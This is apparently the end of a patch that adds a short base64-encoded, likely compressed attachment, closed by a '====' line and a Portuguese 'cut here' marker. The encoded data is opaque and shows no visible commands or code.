+e+UoR1RAKt0UJPI9lHfID1V116fblemdCOCX08Lva/kGo/EWfrwrnaGX3E2A
++HICBkyb914SUBPTRoPdcESKq3Ydwmeh5T1InzbuHFCYuHkPgU56OhKd7HQl
+Osk52kSgbI+SO8rlMHXbqsY8i9IqyqIwacL4LmMoPijMLvSkLQMTw1Tenk4q
+ju9D4EcCGYZQXHbYsFFTPEDYSTjd2d9onmzKvz/6UFJjee+7m/Bk4327hdhh
+5y1yOonvd3yiiPmt62QjEEckW2VXCf343iM/yKAgmhoELlhPMMAWYbzmQLS0
+1zytwvRujt4oOol4yC3LtybNXBYfp9d0IKHRRTnyWuGlEs8JEGgtMSHT7PaG
+bU12x3nnEfufLmDfl33Zl33Zl33Zl33Zl33Zl33Zl33Zl33Zl33Zl33Zl315
+QPl/pS46rwBQAAA=
+====
+
+--- corte aqui ---
